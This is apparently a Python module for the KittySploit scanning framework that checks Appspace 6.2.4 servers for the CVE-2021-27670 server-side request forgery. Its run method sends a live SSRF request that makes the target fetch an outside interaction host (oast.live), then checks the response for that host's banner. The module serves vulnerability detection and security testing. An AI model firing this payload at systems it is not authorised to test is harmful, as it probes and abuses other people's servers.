#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Appspace 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Appspace 6.2.4 - Server-Side Request Forgery Detection',
        'description': 'Appspace 6.2.4 allows SSRF via the api/v1/core/proxy/jsonprequest url parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'appspace', 'ssrf', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/h3110mb/PoCSSrfApp',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27670',
            'https://github.com/ArrestX/--POC',
            'https://github.com/KayCHENvip/vulnerability-poc',
            'https://github.com/Miraitowa70/POC-Notes',
        ],
        'cve': 'CVE-2021-27670',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/v1/core/proxy/jsonprequest?objresponse=false&websiteproxy=true&escapestring=false&url=http://oast.live', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<h1> Interactsh Server </h1>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="Appspace 6.2.4 - Server-Side Request Forgery detected",
                path='/api/v1/core/proxy/jsonprequest?objresponse=false&websiteproxy=true&escapestring=false&url=http://oast.live',
            )
            return True
        return False

